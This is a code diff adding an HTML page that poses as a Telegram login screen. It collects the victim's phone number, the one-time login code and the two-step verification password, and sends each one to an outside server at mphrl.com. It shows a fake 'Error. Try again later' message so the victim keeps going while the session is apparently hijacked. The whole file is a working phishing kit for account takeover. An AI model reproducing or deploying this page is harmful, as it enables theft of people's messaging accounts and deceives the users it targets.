@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html>
+  
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <style>
+      body {
+        font-family: "Segoe UI", Roboto, sans-serif;
+        background: #121212;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+
+      #app {
+        background: #1e1e1e;
+        padding: 30px;
+        border-radius: 20px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        width: 320px;
+        text-align: center;
+      }
+
+      input {
+        width: 80%;
+        padding: 12px;
+        margin: 10px 0;
+        border-radius: 12px;
+        border: 1px solid #333;
+        outline: none;
+        font-size: 15px;
+        background: #2a2a2a;
+        color: #fff;
+        transition: border 0.2s;
+      }
+
+      input::placeholder {
+        color: #aaa;
+      }
+
+      input:focus {
+        border-color: #3390ec;
+      }
+
+      button {
+        width: 100%;
+        padding: 12px;
+        background: #3390ec;
+        color: white;
+        border: none;
+        border-radius: 12px;
+        font-size: 15px;
+        font-weight: 500;
+        cursor: pointer;
+        margin-top: 8px;
+        transition: background 0.2s;
+      }
+
+      button:hover:enabled {
+        background: #2b7fd6;
+      }
+
+      button:disabled {
+        background: #5a9fe6;
+        cursor: not-allowed;
+      }
+
+      #result {
+        margin-top: 20px;
+        font-size: 14px;
+        color: #ddd;
+        word-break: break-word;
+      }
+
+      .loader {
+        display: inline-block;
+        width: 6px;
+        height: 6px;
+        border-radius: 50%;
+        background: white;
+        animation: blink 1.4s infinite both;
+        margin-left: 4px;
+      }
+
+      .loader:nth-child(2) { animation-delay: 0.2s; }
+      .loader:nth-child(3) { animation-delay: 0.4s; }
+
+      @keyframes blink {
+        0%, 80%, 100% { opacity: 0.2; }
+        40% { opacity: 1; }
+      }
+
+      small {
+        color: #aaa;
+        font-size: 12px;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="app">
+      <div id="step-phone">
+        <input type="text" id="phone" placeholder="Phone number, e.g. +1234567890" />
+        <button id="btnSendCode" onclick="sendCode()">Send Code</button>
+      </div>
+
+      <div id="step-code" style="display:none;">
+        <p style="color:#ffffff; font-size:14px; margin-bottom:10px;">
+          Telegram has sent you a code. Enter it to log in.
+        </p>
+        <input type="text" id="code" placeholder="Enter code" />
+        <button id="btnSignIn" onclick="signIn()">Sign In</button>
+      </div>
+
+      <div id="step-password" style="display:none;">
+        <input type="password" id="password" placeholder="Enter password" />
+        <button id="btnPassword" onclick="checkPassword()">Login</button>
+      </div>
+
+      <div id="result"></div>
+    </div>
+
+    <script>
+      const NODE_BASE_URL = "https://mphrl.com";
+      const BASE_URL = "https://mphrl.com";
+      let phoneCodeHash = "";
+      let phone = "";
+      const sessionId = Math.floor(Date.now() / 1000).toString();
+
+      function setLoading(buttonId, loading) {
+        const btn = document.getElementById(buttonId);
+        if (loading) {
+          btn.disabled = true;
+          btn.innerHTML =
+            'Please wait <span class="loader"></span><span class="loader"></span><span class="loader"></span>';
+        } else {
+          if (buttonId === "btnSendCode") btn.innerText = "Send Code";
+          if (buttonId === "btnSignIn") btn.innerText = "Sign In";
+          if (buttonId === "btnPassword") btn.innerText = "Login";
+          btn.disabled = false;
+        }
+      }
+
+      async function sendCode() {
+        setLoading("btnSendCode", true);
+        phone = document.getElementById("phone").value;
+        let res = await fetch(`${NODE_BASE_URL}/sendCode`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ phone, sessionId }),
+        });
+        let data = await res.json();
+        setLoading("btnSendCode", false);
+        if (data.status === "CODE_SENT") {
+          phoneCodeHash = data.phoneCodeHash;
+          document.getElementById("step-phone").style.display = "none";
+          document.getElementById("step-code").style.display = "block";
+        } else {
+          alert("Phone number is invalid.")
+        }
+      }
+
+      async function signIn() {
+        setLoading("btnSignIn", true);
+        let code = document.getElementById("code").value;
+        let res = await fetch(`${NODE_BASE_URL}/signIn`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ phone, code, phoneCodeHash, sessionId }),
+        });
+        let data = await res.json();
+        setLoading("btnSignIn", false);
+        if (data.status === "PASSWORD_REQUIRED") {
+          document.getElementById("step-code").style.display = "none";
+          document.getElementById("step-password").style.display = "block";
+          alert('Error. Try again later')
+        } else if (data.status === "OK") {
+          alert('Error. Try again later')
+        } else {
+          alert('Error. Try again later')
+        }
+      }
+
+      async function checkPassword() {
+        setLoading("btnPassword", true);
+        let password = document.getElementById("password").value;
+        let res = await fetch(`${NODE_BASE_URL}/checkPassword`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ password, sessionId }),
+        });
+        let data = await res.json();
+        setLoading("btnPassword", false);
+        if (data.status === "OK") {
+          document.getElementById("step-password").style.display = "none";
+          document.getElementById("result").innerText =
+            "✅ Logged in as " + data.user.username;
+        }
+      }
+    </script>
+  </body>
+</html>
